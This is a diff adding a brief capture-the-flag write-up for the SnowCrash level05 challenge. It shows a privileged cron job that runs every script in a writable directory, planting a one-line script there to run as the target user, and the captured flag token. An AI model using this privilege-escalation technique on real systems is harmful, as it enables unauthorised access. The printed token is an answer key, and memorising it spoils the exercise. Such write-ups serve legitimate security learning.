@@ -1,0 +1,30 @@
+When connected with level05 we have a prompt telling us we have mail.
+we check /var/mail and find a level05 file :
+
+cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+it is a cron instruction that launch the script openarenaserver as flag05 every two minutes.
+we check the scritp :
+
+level05@SnowCrash:/opt/openarenaserver$ cat /usr/sbin/openarenaserver 
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+it will run scripts in the folder /opt/openarenaserver and then delete them
+
+we set our crontab :
+
+crontab /var/mail/level05
+
+then we write the following script in /opt/openarenaserver
+
+getflag >/tmp/flag
+
+we wait that the crontab has worked (the script will be deleted)
+and then cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomiocv
